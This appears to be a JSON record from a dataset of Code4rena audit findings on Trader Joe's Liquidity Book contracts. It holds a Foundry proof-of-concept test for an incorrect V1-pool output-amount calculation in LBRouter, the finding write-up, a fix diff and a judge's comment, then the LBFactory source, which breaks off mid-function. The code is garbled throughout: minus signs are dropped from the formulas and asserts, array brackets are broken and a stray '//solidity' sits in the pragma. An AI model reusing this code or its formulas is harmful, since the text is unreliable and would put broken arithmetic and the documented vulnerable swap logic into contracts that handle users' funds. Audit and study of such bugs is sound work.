                    "//solidity\n// test/audit/RouterMath2.t.sol\n// SPDX-License-Identifier: UNLICENSED\n\npragma //solidity ^0.8.7;\n\nimport \"../TestHelper.sol\";\n\nimport \"../../src/LBRouter.sol\";\nimport \"../../src/interfaces/IJoePair.sol\";\n\ncontract RouterMath2Test is TestHelper {\n    IERC20 internal token;\n    uint256 internal actualAmountOut;\n\n    function setUp() public {\n        token = new ERC20MockDecimals(18);\n        ERC20MockDecimals(address(token)).mint(address(this), 100e18);\n\n        router = new LBRouter(\n            ILBFactory(address(0x00)),\n            IJoeFactory(address(this)),\n            IWAVAX(address(0x02))\n        );\n    }\n\n    // Imitates V1 factory.\n    function getPair(address, /*tokenX*/ address /*tokenY*/ ) public view returns (address) {\n        return address(this);\n    }\n\n    // Imitates V1 pool.\n    function getReserves() public pure returns (uint112, uint112, uint32) {\n        return (1e18, 1e18, 0);\n    }\n\n    // Imitates V1 pool.\n    function balanceOf(address /*acc*/) public pure returns (uint256) {\n        return 0.0001e18;\n    }\n\n    // Imitates V1 pool.\n    function swap(uint256 amount0, uint256 amount1, address to, bytes memory data) public {\n        actualAmountOut = amount0 == 0 ? amount1 : amount0;\n    }\n\n    function testScenario() public {\n        // Setting up a swap via one V1 pool.\n        uint256[] memory steps = new uint256[(1);\n        steps[0] = 0;\n\n        IERC20[] memory path = new IERC20[(2);\n        path[0] = IERC20(address(token));\n        path[1] = IERC20(address(this));\n\n        uint256 amountIn = 0.0001e18;\n\n        token.approve(address(router), 1e18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amountIn, 0, steps, path, address(this), block.timestamp + 1000\n        );\n        // This amount was calculated incorrectly.\n        assertEq(actualAmountOut, 987030000000000000); // Equals to 989970211528238869 when fixed.\n\n\n        address _pair = address(this);\n        uint256 expectedAmountOut;\n\n        // Reproduce the calculations using JoeLibrary.getAmountIn. This piece:\n        // https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L888-L899\n        (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n        if (address(token) < address(this)) {\n            uint256 _balance = token.balanceOf(_pair);\n            expectedAmountOut = JoeLibrary.getAmountOut(_balance _reserve0, _reserve0, _reserve1);\n        } else {\n            uint256 _balance = token.balanceOf(_pair);\n            expectedAmountOut = JoeLibrary.getAmountOut(_balance _reserve1, _reserve1, _reserve0);\n        }\n\n        // This is the correct amount.\n        assertEq(expectedAmountOut, 989970211528238869);\n\n        // The wrong amount is smaller than the expected one.\n        assertEq(expectedAmountOut actualAmountOut, 2940211528238869);\n    }\n}\n"
                ],
                "Type": " Incorrect output amount calculation for Trader Joe V1 pools",
                "Description": "*Submitted by Jeiwan(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345), also found by KIntern_NA(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/401) and cccz(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/90)*\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891<br\n<https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896<br\n\nOutput amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools.\n\n\nLBRouter(https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L21) is a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions:\n\n*   swapExactTokensForTokensSupportingFeeOnTransferTokens(https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L531), which makes chained swaps (i.e. swaps between tokens that don't have a pair) of tokens implementing fee on transfer (i.e. there's fee reduced from every transferred amount);\n*   swapExactTokensForAVAXSupportingFeeOnTransferTokens(https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L561), which is the variation of the above function which takes AVAX as the output token;\n*   swapExactAVAXForTokensSupportingFeeOnTransferTokens(https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L594), which is the variation of the previous function which takes AVA as the input token.\n\nUnder the hood, these three functions call _swapSupportingFeeOnTransferTokens(https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L864), which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when _binStep is 0 (which is never true in V2 pools), it's assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools' reserves and balances:\n\nsolidity\nif (_binStep == 0) {\n    (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n    if (_token < _tokenNext) {\n        uint256 _balance = _token.balanceOf(_pair);\n        uint256 _amountOut = (_reserve1 * (_balance _reserve0) * 997) / (_balance * 1_000);\n\n        IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");\n    } else {\n        uint256 _balance = _token.balanceOf(_pair);\n        uint256 _amountOut = (_reserve0 * (_balance _reserve1) * 997) / (_balance * 1_000);\n\n        IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");\n    }\n} else {\n    ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient);\n}\n\n\nHowever, these calculations are incorrect. Here's the difference:\n\ndiff\n@@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {\n                     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n                     if (_token < _tokenNext) {\n                         uint256 _balance = _token.balanceOf(_pair);\n                       uint256 _amountOut = (_reserve1 * (_balance _reserve0) * 997) / (_balance * 1_000);\n+                        uint256 amountInWithFee = (_balance _reserve0) * 997;\n+                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);\n\n                         IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");\n                     } else {\n                         uint256 _balance = _token.balanceOf(_pair);\n                       uint256 _amountOut = (_reserve0 * (_balance _reserve1) * 997) / (_balance * 1_000);\n+                        uint256 amountInWithFee = (_balance _reserve1) * 997;\n+                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);\n\n                         IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");\n                     }\n\n\nThese calculations are implemented correctly in JoeLibrary.getAmountOut(https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/JoeLibrary.sol#L30-L41), which is used in LBQuoter(https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L83).  Also it's used in Trader Joe V1 to calculate output amounts in similar functions:\n\n*   <https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375\n\nsolidity\n// test/audit/RouterMath2.t.sol\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.7;\n\nimport \"../TestHelper.sol\";\n\nimport \"../../src/LBRouter.sol\";\nimport \"../../src/interfaces/IJoePair.sol\";\n\ncontract RouterMath2Test is TestHelper {\n    IERC20 internal token;\n    uint256 internal actualAmountOut;\n\n    function setUp() public {\n        token = new ERC20MockDecimals(18);\n        ERC20MockDecimals(address(token)).mint(address(this), 100e18);\n\n        router = new LBRouter(\n            ILBFactory(address(0x00)),\n            IJoeFactory(address(this)),\n            IWAVAX(address(0x02))\n        );\n    }\n\n    // Imitates V1 factory.\n    function getPair(address, /*tokenX*/ address /*tokenY*/ ) public view returns (address) {\n        return address(this);\n    }\n\n    // Imitates V1 pool.\n    function getReserves() public pure returns (uint112, uint112, uint32) {\n        return (1e18, 1e18, 0);\n    }\n\n    // Imitates V1 pool.\n    function balanceOf(address /*acc*/) public pure returns (uint256) {\n        return 0.0001e18;\n    }\n\n    // Imitates V1 pool.\n    function swap(uint256 amount0, uint256 amount1, address to, bytes memory data) public {\n        actualAmountOut = amount0 == 0 ? amount1 : amount0;\n    }\n\n    function testScenario() public {\n        // Setting up a swap via one V1 pool.\n        uint256[] memory steps = new uint256[(1);\n        steps[0] = 0;\n\n        IERC20[] memory path = new IERC20[(2);\n        path[0] = IERC20(address(token));\n        path[1] = IERC20(address(this));\n\n        uint256 amountIn = 0.0001e18;\n\n        token.approve(address(router), 1e18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amountIn, 0, steps, path, address(this), block.timestamp + 1000\n        );\n        // This amount was calculated incorrectly.\n        assertEq(actualAmountOut, 987030000000000000); // Equals to 989970211528238869 when fixed.\n\n\n        address _pair = address(this);\n        uint256 expectedAmountOut;\n\n        // Reproduce the calculations using JoeLibrary.getAmountIn. This piece:\n        // https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L888-L899\n        (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n        if (address(token) < address(this)) {\n            uint256 _balance = token.balanceOf(_pair);\n            expectedAmountOut = JoeLibrary.getAmountOut(_balance _reserve0, _reserve0, _reserve1);\n        } else {\n            uint256 _balance = token.balanceOf(_pair);\n            expectedAmountOut = JoeLibrary.getAmountOut(_balance _reserve1, _reserve1, _reserve0);\n        }\n\n        // This is the correct amount.\n        assertEq(expectedAmountOut, 989970211528238869);\n\n        // The wrong amount is smaller than the expected one.\n        assertEq(expectedAmountOut actualAmountOut, 2940211528238869);\n    }\n}\n\n\n",
                "Repair": "\nConsider using the JoeLibrary.getAmountOut function in the _swapSupportingFeeOnTransferTokens function of LBRouter when computing output amounts for V1 pools.\n\n0x0Louis (Trader Joe) confirmed(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345#issuecomment-1310464655):\n  The warden has shown how, due to incorrect calculations, swaps routed through V1 functions may cause losses to end users.\n \n Because the issue is with a core mechanism of the protocol, and the warden has shown (via coded POC) how a loss can happen, I agree with High Severity.\n \n While this finding is similar to H-01, at this time I think it's different enough to keep it separate as the internals and code paths are distinct.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"openzeppelin/proxy/Clones.sol\";\nimport \"openzeppelin/utils/structs/EnumerableSet.sol\";\n\nimport \"./LBErrors.sol\";\nimport \"./libraries/Constants.sol\";\nimport \"./libraries/Decoder.sol\";\nimport \"./libraries/PendingOwnable.sol\";\nimport \"./libraries/SafeCast.sol\";\nimport \"./interfaces/ILBFactory.sol\";\n\n/// @title Liquidity Book Factory\n/// @author Trader Joe\n/// @notice Contract used to deploy and register new LBPairs.\n/// Enables setting fee parameters, flashloan fees and LBPair implementation.\n/// Unless the `creationUnlocked` is `true`, only the owner of the factory can create pairs.\ncontract LBFactory is PendingOwnable, ILBFactory {\n    using SafeCast for uint256;\n    using Decoder for bytes32;\n    using EnumerableSet for EnumerableSet.AddressSet;\n\n    uint256 public constant override MAX_FEE = 0.1e18; // 10%\n\n    uint256 public constant override MIN_BIN_STEP = 1; // 0.01%\n    uint256 public constant override MAX_BIN_STEP = 100; // 1%, can't be greater than 247 for indexing reasons\n\n    uint256 public constant override MAX_PROTOCOL_SHARE = 2_500; // 25%\n\n    address public override LBPairImplementation;\n\n    address public override feeRecipient;\n\n    uint256 public override flashLoanFee;\n\n    /// @notice Whether the createLBPair function is unlocked and can be called by anyone (true) or only by owner (false)\n    bool public override creationUnlocked;\n\n    ILBPair[] public override allLBPairs;\n\n    /// @dev Mapping from a (tokenA, tokenB, binStep) to a LBPair. The tokens are ordered to save gas, but they can be\n    /// in the reverse order in the actual pair. Always query one of the 2 tokens of the pair to assert the order of the 2 tokens\n    mapping(IERC20 => mapping(IERC20 => mapping(uint256 => LBPairInformation))) private _LBPairsInfo;\n\n    // Whether a preset was set or not, if the bit at `index` is 1, it means that the binStep `index` was set\n    // The max binStep set is 247. We use this method instead of an array to keep it ordered and to reduce gas\n    bytes32 private _availablePresets;\n\n    // The parameters presets\n    mapping(uint256 => bytes32) private _presets;\n\n    EnumerableSet.AddressSet private _quoteAssetWhitelist;\n\n    // Whether a LBPair was created with a bin step, if the bit at `index` is 1, it means that the LBPair with binStep `index` exists\n    // The max binStep set is 247. We use this method instead of an array to keep it ordered and to reduce gas\n    mapping(IERC20 => mapping(IERC20 => bytes32)) private _availableLBPairBinSteps;\n\n    /// @notice Constructor\n    /// @param _feeRecipient The address of the fee recipient\n    /// @param _flashLoanFee The value of the fee for flash loan\n    constructor(address _feeRecipient, uint256 _flashLoanFee) {\n        _setFeeRecipient(_feeRecipient);\n\n        flashLoanFee = _flashLoanFee;\n        emit FlashLoanFeeSet(0, _flashLoanFee);\n    }\n\n    /// @notice View function to return the number of LBPairs created\n    /// @return The number of LBPair\n    function getNumberOfLBPairs() external view override returns (uint256) {\n        return allLBPairs.length;\n    }\n\n    /// @notice View function to return the number of quote assets whitelisted\n    /// @return The number of quote assets\n    function getNumberOfQuoteAssets() external view override returns (uint256) {\n        return _quoteAssetWhitelist.length();\n    }\n\n    /// @notice View function to return the quote asset whitelisted at index `index`\n    /// @param _index The index\n    /// @return The address of the _quoteAsset at index `index`\n    function getQuoteAsset(uint256 _index) external view override returns (IERC20) {\n        return IERC20(_quoteAssetWhitelist.at(_index));\n    }\n\n    /// @notice View function to return whether a token is a quotedAsset (true) or not (false)\n    /// @param _token The address of the asset\n    /// @return Whether the token is a quote asset or not\n    function isQuoteAsset(IERC20 _token) external view override returns (bool) {\n        return _quoteAssetWhitelist.contains(address(_token));\n    }\n\n    /// @notice Returns the LBPairInformation if it exists,\n    /// if not, then the address 0 is returned. The order doesn't matter\n    /// @param _tokenA The address of the first token of the pair\n    /// @param _tokenB The address of the second token of the pair\n    /// @param _binStep The bin step of the LBPair\n    /// @return The LBPairInformation\n    function getLBPairInformation(\n        IERC20 _tokenA,\n        IERC20 _tokenB,\n        uint256 _binStep\n    ) external view override returns (LBPairInformation memory) {\n        return _getLBPairInformation(_tokenA, _tokenB, _binStep);\n    }\n\n    /// @notice View function to return the different parameters of the preset\n    /// @param _binStep The bin step of the preset\n    /// @return baseFactor The base factor\n    /// @return filterPeriod The filter period of the preset\n    /// @return decayPeriod The decay period of the preset\n    /// @return reductionFactor The reduction factor of the preset\n    /// @return variableFeeControl The variable fee control of the preset\n    /// @return protocolShare The protocol share of the preset\n    /// @return maxVolatilityAccumulated The max volatility accumulated of the preset\n    /// @return sampleLifetime The sample lifetime of the preset\n    function getPreset(uint16 _binStep)\n        external\n        view\n        override\n        returns (\n            uint256 baseFactor,\n            uint256 filterPeriod,\n            uint256 decayPeriod,\n            uint256 reductionFactor,\n            uint256 variableFeeControl,\n            uint256 protocolShare,\n            uint256 maxVolatilityAccumulated,\n            uint256 sampleLifetime\n        )\n    {\n        bytes32 _preset = _presets[_binStep];\n        if (_preset == bytes32(0)) revert LBFactory__BinStepHasNoPreset(_binStep);\n\n        uint256 _shift;\n\n        // Safety check\n        assert(_binStep == _preset.decode(type(uint16).max, _shift));\n\n        baseFactor = _preset.decode(type(uint16).max, _shift += 16);\n        filterPeriod = _preset.decode(type(uint16).max, _shift += 16);\n        decayPeriod = _preset.decode(type(uint16).max, _shift += 16);\n        reductionFactor = _preset.decode(type(uint16).max, _shift += 16);\n        variableFeeControl = _preset.decode(type(uint24).max, _shift += 16);\n        protocolShare = _preset.decode(type(uint16).max, _shift += 24);\n        maxVolatilityAccumulated = _preset.decode(type(uint24).max, _shift += 16);\n\n        sampleLifetime = _preset.decode(type(uint16).max, 240);\n    }\n\n    /// @notice View function to return the list of available binStep with a preset\n    /// @return presetsBinStep The list of binStep\n    function getAllBinSteps() external view override returns (uint256[] memory presetsBinStep) {\n        unchecked {\n            bytes32 _avPresets = _availablePresets;\n            uint256 _nbPresets = _avPresets.decode(type(uint8).max, 248);\n\n            if (_nbPresets > 0) {\n                presetsBinStep = new uint256[](_nbPresets);\n\n                uint256 _index;\n                for (uint256 i = MIN_BIN_STEP; i <= MAX_BIN_STEP; ++i) {\n                    if (_avPresets.decode(1, i) == 1) {\n                        presetsBinStep[_index] = i;\n                        if (++_index == _nbPresets) break;\n                    }\n                }\n            }\n        }\n    }\n\n    /// @notice View function to return all the LBPair of a pair of tokens\n    /// @param _tokenX The first token of the pair\n    /// @param _tokenY The second token of the pair\n    /// @return LBPairsAvailable The list of available LBPairs\n    function getAllLBPairs(IERC20 _tokenX, IERC20 _tokenY)\n        external\n        view\n        override\n        returns (LBPairInformation[] memory LBPairsAvailable)\n    {\n        unchecked {\n            (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY);\n\n            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenA][_tokenB];\n            uint256 _nbAvailable = _avLBPairBinSteps.decode(type(uint8).max, 248);\n\n            if (_nbAvailable > 0) {\n                LBPairsAvailable = new LBPairInformation[](_nbAvailable);\n\n                uint256 _index;\n                for (uint256 i = MIN_BIN_STEP; i <= MAX_BIN_STEP; ++i) {\n                    if (_avLBPairBinSteps.decode(1, i) == 1) {\n                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i];\n\n                        LBPairsAvailable[_index] = LBPairInformation({\n                            binStep: i.safe24(),\n                            LBPair: _LBPairInformation.LBPair,\n                            createdByOwner: _LBPairInformation.createdByOwner,\n                            ignoredForRouting: _LBPairInformation.ignoredForRouting\n                        });\n                        if (++_index == _nbAvailable) break;\n                    }\n                }\n            }\n        }\n    }\n\n    /// @notice Set the LBPair implementation address\n    /// @dev Needs to be called by the owner\n    /// @param _LBPairImplementation The address of the implementation\n    function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {\n        if (ILBPair(_LBPairImplementation).factory() != this)\n            revert LBFactory__LBPairSafetyCheckFailed(_LBPairImplementation);\n\n        address _oldLBPairImplementation = LBPairImplementation;\n        if (_oldLBPairImplementation == _LBPairImplementation)\n            revert LBFactory__SameImplementation(_LBPairImplementation);\n\n        LBPairImplementation = _LBPairImplementation;\n\n        emit LBPairImplementationSet(_oldLBPairImplementation, _LBPairImplementation);\n    }\n\n    /// @notice Create a liquidity bin LBPair for _tokenX and _tokenY\n    /// @param _tokenX The address of the first token\n    /// @param _tokenY The address of the second token\n    /// @param _activeId The active id of the pair\n    /// @param _binStep The bin step in basis point, used to calculate log(1 + binStep)\n    /// @return _LBPair The address of the newly created LBPair\n    function createLBPair(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint24 _activeId,\n        uint16 _binStep\n    ) external override returns (ILBPair _LBPair) {\n        address _owner = owner();\n        if (!creationUnlocked && msg.sender != _owner) revert LBFactory__FunctionIsLockedForUsers(msg.sender);\n\n        address _LBPairImplementation = LBPairImplementation;\n\n        if (_LBPairImplementation == address(0)) revert LBFactory__ImplementationNotSet();\n\n        if (!_quoteAssetWhitelist.contains(address(_tokenY))) revert LBFactory__QuoteAssetNotWhitelisted(_tokenY);\n\n        if (_tokenX == _tokenY) revert LBFactory__IdenticalAddresses(_tokenX);\n\n        // We sort token for storage efficiency, only one input needs to be stored\n        (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY);\n        // single check is sufficient\n        if (address(_tokenA) == address(0)) revert LBFactory__AddressZero();\n        if (address(_LBPairsInfo[_tokenA][_tokenB][_binStep].LBPair) != address(0))\n            revert LBFactory__LBPairAlreadyExists(_tokenX, _tokenY, _binStep);\n\n        bytes32 _preset = _presets[_binStep];\n        if (_preset == bytes32(0)) revert LBFactory__BinStepHasNoPreset(_binStep);\n\n        uint256 _sampleLifetime = _preset.decode(type(uint16).max, 240);\n        // We remove the bits that are not part of the feeParameters\n        _preset &= bytes32(uint256(type(uint144).max));\n\n        bytes32 _salt = keccak256(abi.encode(_tokenA, _tokenB, _binStep));\n        _LBPair = ILBPair(Clones.cloneDeterministic(_LBPairImplementation, _salt));\n\n        _LBPair.initialize(_tokenX, _tokenY, _activeId, uint16(_sampleLifetime), _preset);\n\n        _LBPairsInfo[_tokenA][_tokenB][_binStep] = LBPairInformation({\n            binStep: _binStep,\n            LBPair: _LBPair,\n            createdByOwner: msg.sender == _owner,\n            ignoredForRouting: false\n        });\n\n        allLBPairs.push(_LBPair);\n\n        {\n            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenA][_tokenB];\n            // We add a 1 at bit `_binStep` as this binStep is now set\n            _avLBPairBinSteps = bytes32(uint256(_avLBPairBinSteps) | (1 << _binStep));\n\n            // Increase the number of lb pairs by 1\n            _avLBPairBinSteps = bytes32(uint256(_avLBPairBinSteps) + (1 << 248));\n\n            // Save the changes\n            _availableLBPairBinSteps[_tokenA][_tokenB] = _avLBPairBinSteps;\n        }\n\n        emit LBPairCreated(_tokenX, _tokenY, _binStep, _LBPair, allLBPairs.length - 1);\n\n        emit FeeParametersSet(\n            msg.sender,\n            _LBPair,\n            _binStep,\n            _preset.decode(type(uint16).max, 16),\n            _preset.decode(type(uint16).max, 32),\n            _preset.decode(type(uint16).max, 48),\n            _preset.decode(type(uint16).max, 64),\n            _preset.decode(type(uint24).max, 80),\n            _preset.decode(type(uint16).max, 104),\n            _preset.decode(type(uint24).max, 120)\n        );\n    }\n\n    /// @notice Function to set whether the pair is ignored or not for routing, it will make the pair unusable by the router\n    /// @param _tokenX The address of the first token of the pair\n    /// @param _tokenY The address of the second token of the pair\n    /// @param _binStep The bin step in basis point of the pair\n    /// @param _ignored Whether to ignore (true) or not (false) the pair for routing\n    function setLBPairIgnored(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint256 _binStep,\n        bool _ignored\n    ) external override onlyOwner {\n        (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY);\n\n        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][_binStep];\n        if (address(_LBPairInformation.LBPair) == address(0)) revert LBFactory__AddressZero();\n\n        if (_LBPairInformation.ignoredForRouting == _ignored) revert LBFactory__LBPairIgnoredIsAlreadyInTheSameState();\n\n        _LBPairsInfo[_tokenA][_tokenB][_binStep].ignoredForRouting = _ignored;\n\n        emit LBPairIgnoredStateChanged(_LBPairInformation.LBPair, _ignored);\n    }\n\n    /// @notice Sets the preset parameters of a bin step\n    /// @param _binStep The bin step in basis point, used to calculate log(1 + binStep)\n    /// @param _baseFactor The base factor, used to calculate the base fee, baseFee = baseFactor * binStep\n    /// @param _filterPeriod The period where the accumulator value is untouched, prevent spam\n    /// @param _decayPeriod The period where the accumulator value is halved\n    /// @param _reductionFactor The reduction factor, used to calculate the reduction of the accumulator\n    /// @param _variableFeeControl The variable fee control, used to control the variable fee, can be 0 to disable them\n    /// @param _protocolShare The share of the fees received by the protocol\n    /// @param _maxVolatilityAccumulated The max value of the volatility accumulated\n    /// @param _sampleLifetime The lifetime of an oracle's sample\n    function setPreset(\n        uint16 _binStep,\n        uint16 _baseFactor,\n        uint16 _filterPeriod,\n        uint16 _decayPeriod,\n        uint16 _reductionFactor,\n        uint24 _variableFeeControl,\n        uint16 _protocolShare,\n        uint24 _maxVolatilityAccumulated,\n        uint16 _sampleLifetime\n    ) external override onlyOwner {\n        bytes32 _packedFeeParameters = _getPackedFeeParameters(\n            _binStep,\n            _baseFactor,\n            _filterPeriod,\n            _decayPeriod,\n            _reductionFactor,\n            _variableFeeControl,\n            _protocolShare,\n            _maxVolatilityAccumulated\n        );\n\n        // The last 16 bits are reserved for sampleLifetime\n        bytes32 _preset = bytes32(\n            (uint256(_packedFeeParameters) & type(uint144).max) | (uint256(_sampleLifetime) << 240)\n        );\n\n        _presets[_binStep] = _preset;\n\n        bytes32 _avPresets = _availablePresets;\n        if (_avPresets.decode(1, _binStep) == 0) {\n            // We add a 1 at bit `_binStep` as this binStep is now set\n            _avPresets = bytes32(uint256(_avPresets) | (1 << _binStep));\n\n            // Increase the number of preset by 1\n            _avPresets = bytes32(uint256(_avPresets) + (1 << 248));\n\n            // Save the changes\n            _availablePresets = _avPresets;\n        }\n\n        emit PresetSet(\n            _binStep,\n            _baseFactor,\n            _filterPeriod,\n            _decayPeriod,\n            _reductionFactor,\n            _variableFeeControl,\n            _protocolShare,\n            _maxVolatilityAccumulated,\n            _sampleLifetime\n        );\n    }\n\n    /// @notice Remove the preset linked to a binStep\n    /// @param _binStep The bin step to remove\n    function removePreset(uint16 _binStep) external override onlyOwner {\n        if (_presets[_binStep] == bytes32(0)) revert LBFactory__BinStepHasNoPreset(_binStep);\n\n        // Set the bit `_binStep` to 0\n        bytes32 _avPresets = _availablePresets;\n\n        _avPresets &= bytes32(type(uint256).max - (1 << _binStep));\n        _avPresets = bytes32(uint256(_avPresets) - (1 << 248));\n\n        // Save the changes\n        _availablePresets = _avPresets;\n        delete _presets[_binStep];\n\n        emit PresetRemoved(_binStep);\n    }\n\n    /// @notice Function to set the fee parameter of a LBPair\n    /// @param _tokenX The address of the first token\n    /// @param _tokenY The address of the second token\n    /// @param _binStep The bin step in basis point, used to calculate log(1 + binStep)\n    /// @param _baseFactor The base factor, used to calculate the base fee, baseFee = baseFactor * binStep\n    /// @param _filterPeriod The period where the accumulator value is untouched, prevent spam\n    /// @param _decayPeriod The period where the accumulator value is halved\n    /// @param _reductionFactor The reduction factor, used to calculate the reduction of the accumulator\n    /// @param _variableFeeControl The variable fee control, used to control the variable fee, can be 0 to disable them\n    /// @param _protocolShare The share of the fees received by the protocol\n    /// @param _maxVolatilityAccumulated The max value of volatility accumulated\n    function setFeesParametersOnPair(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint16 _binStep,\n        uint16 _baseFactor,\n        uint16 _filterPeriod,\n        uint16 _decayPeriod,\n        uint16 _reductionFactor,\n        uint24 _variableFeeControl,\n        uint16 _protocolShare,\n        uint24 _maxVolatilityAccumulated\n    ) external override onlyOwner {\n        ILBPair _LBPair = _getLBPairInformation(_tokenX, _tokenY, _binStep).LBPair;\n\n        if (address(_LBPair) == address(0)) revert LBFactory__LBPairNotCreated(_tokenX, _tokenY, _binStep);\n\n        bytes32 _packedFeeParameters = _getPackedFeeParameters(\n            _binStep,\n            _baseFactor,\n            _filterPeriod,\n            _decayPeriod,\n            _reductionFactor,\n            _variableFeeControl,\n            _protocolShare,\n            _maxVolatilityAccumulated\n        );\n\n        _LBPair.setFeesParameters(_packedFeeParameters);\n\n        emit FeeParametersSet(\n            msg.sender,\n            _LBPair,\n            _binStep,\n            _baseFactor,\n            _filterPeriod,\n            _decayPeriod,\n            _reductionFactor,\n            _variableFeeControl,\n            _protocolShare,\n            _maxVolatilityAccumulated\n        );\n    }\n\n    /// @notice Function to set the recipient of the fees. This address needs to be able to receive ERC20s\n    /// @param _feeRecipient The address of the recipient\n    function setFeeRecipient(address _feeRecipient) external override onlyOwner {\n        _setFeeRecipient(_feeRecipient);\n    }\n\n    /// @notice Function to set the flash loan fee\n    /// @param _flashLoanFee The value of the fee for flash loan\n    function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {\n        uint256 _oldFlashLoanFee = flashLoanFee;\n\n        if (_oldFlashLoanFee == _flashLoanFee) revert LBFactory__SameFlashLoanFee(_flashLoanFee);\n\n        flashLoanFee = _flashLoanFee;\n        emit FlashLoanFeeSet(_oldFlashLoanFee, _flashLoanFee);\n    }\n\n    /// @notice Function to set the creation restriction of the Factory\n    /// @param _locked If the creation is restricted (true) or not (false)\n    function setFactoryLockedState(bool _locked) external override onlyOwner {\n        if (creationUnlocked != _locked) revert LBFactory__FactoryLockIsAlreadyInTheSameState();\n        creationUnlocked = !_locked;\n        emit FactoryLockedStatusUpdated(_locked);\n    }\n\n    /// @notice Function to add an asset to the whitelist of quote assets\n    /// @param _quoteAsset The quote asset (e.g: AVAX, USDC...)\n    function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {\n        if (!_quoteAssetWhitelist.add(address(_quoteAsset)))\n            revert LBFactory__QuoteAssetAlreadyWhitelisted(_quoteAsset);\n\n        emit QuoteAssetAdded(_quoteAsset);\n    }\n\n    /// @notice Function to remove an asset to the whitelist of quote assets\n    /// @param _quoteAsset The quote asset (e.g: AVAX, USDC...)\n    function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {\n        if (!_quoteAssetWhitelist.remove(address(_quoteAsset))) revert LBFactory__QuoteAssetNotWhitelisted(_quoteAsset);\n\n        emit QuoteAssetRemoved(_quoteAsset);\n    }\n\n    /// @notice Internal function to set the recipient of the fee\n    /// @param _feeRecipient The address of the recipient\n    function _setFeeRecipient(address _feeRecipient) internal {\n        if (_feeRecipient == address(0)) revert LBFactory__AddressZero();\n\n        address _oldFeeRecipient = feeRecipient;\n        if (_oldFeeRecipient == _feeRecipient) revert LBFactory__SameFeeRecipient(_feeRecipient);\n\n        feeRecipient = _feeRecipient;\n        emit FeeRecipientSet(_oldFeeRecipient, _feeRecipient);\n    }\n\n    function forceDecay(ILBPair _LBPair) external override onlyOwner {\n        _LBPair.forceDecay();\n    }\n\n    /// @notice Internal function to set the fee parameter of a LBPair\n    /// @param _binStep The bin step in basis point, used to calculate log(1 + binStep)\n    /// @param _baseFactor The base factor, used to calculate the base fee, baseFee = baseFactor * binStep\n    /// @param _filterPeriod The period where the accumulator value is untouched, prevent spam\n    /// @param _decayPeriod The period where the accumulator value is halved\n    /// @param _reductionFactor The reduction factor, used to calculate the reduction of the accumulator\n    /// @param _variableFeeControl The variable fee control, used to control the variable fee, can be 0 to disable them\n    /// @param _protocolShare The share of the fees received by the protocol\n    /// @param _maxVolatilityAccumulated The max value of volatility accumulated\n    function _getPackedFeeParameters(\n        uint16 _binStep,\n        uint16 _baseFactor,\n        uint16 _filterPeriod,\n        uint16 _decayPeriod,\n        uint16 _reductionFactor,\n        uint24 _variableFeeControl,\n        uint16 _protocolShare,\n        